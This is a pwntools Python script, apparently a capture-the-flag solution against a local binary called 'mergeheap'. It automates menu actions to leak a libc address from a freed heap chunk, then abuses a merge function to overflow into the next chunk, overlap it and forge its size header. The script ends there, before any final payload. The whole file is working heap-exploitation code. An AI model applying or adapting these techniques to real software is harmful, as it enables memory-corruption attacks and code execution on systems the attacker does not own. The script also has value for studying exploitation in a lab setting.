from pwn import *
context.log_level = 'debug'

def sl(data):
	p.sendline(data);

def ru(data):
	return p.recvuntil(data)

def se(data):
	p.send(data)


def add(length , data):
	ru(">>")
	sl("1")
	ru("len:")
	sl(str(length))
	ru("ent:")
	sl(data)


def dele(idx):
	ru(">>")
	sl("3")
	ru("idx:")
	sl(str(idx))


def merge(idx1,idx2):
	ru(">>")
	sl("4")
	p.recv()
	sl(str(idx1))
	p.recv()
	sl(str(idx2))

def show(idx):
	ru(">>")
	sl("2")
	ru("idx:")
	sl(str(idx))


def add2(content):
        p.recvuntil('>>')
        p.sendline("1")
        p.recvuntil(":")
        p.sendline(str(len(content)))
        p.recvuntil(":")
        p.send(content)


p = process('./mergeheap')

add2("a"*0x100) #0
add2("a"*0x100) #1
add2("a"*0x100)#2
add2("a"*0x100)#3
add2("a"*0x100)#4
add2("a"*0x100)#5
add2("a"*0x100)#6
add2("a"*0x100)#7
add2("a"*0x100)#8
add2("a"*0x100)#9

for i in range(7):
        dele(1+i)#1~7

dele(8)#8
for i in range(7):
        add2("a"*0x100)

add2("aaaaaaaa")
show(8)
p.recvuntil('aaaaaaaa')
leak_base = u64(p.recv(6).ljust(8,'\x00'))
libc_base = leak_base - 0x7ffff7dd1b78 +0x7ffff7dd1b10

dele(0)
dele(8)
dele(9)

padding = "a"*0x18

# 0
add(0x18,padding)
padding2 = "\xe1"*0x10
#1
add(0x10,padding2)
#2
add(0x90,"1")
#gdb.attach(p)
#3 4 5
add(0x28,"28")
add(0x40,"40")
add(0x80,"40")

#6
add(0x20,"20")
dele(3)
#overlapping 4th chunk
merge(0,1)

dele(4)
padding3 = "AAAAAAAA"*9 + p64(0x91) + p64(0x909090909090)
add(0xd8,padding3)

